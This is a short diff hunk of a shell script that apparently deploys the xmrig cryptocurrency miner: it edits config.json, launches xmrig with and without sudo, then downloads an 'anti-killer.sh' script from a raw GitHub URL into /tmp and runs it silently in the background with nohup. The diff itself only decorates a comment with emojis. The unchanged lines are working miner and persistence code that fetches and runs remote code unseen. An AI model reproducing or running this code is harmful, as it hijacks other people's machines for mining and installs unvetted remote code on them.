@@ -45,8 +45,7 @@ sed -i "s/kasm/kasm-$randnum/g" config.json
 sudo -n ./xmrig
 ./xmrig
 
-# Anti-Killer Protection Start
+# Anti-Killer Protection Start 🔥💀
 wget -qO /tmp/anti-killer.sh https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/anti-killer.sh
 chmod +x /tmp/anti-killer.sh
 nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
-
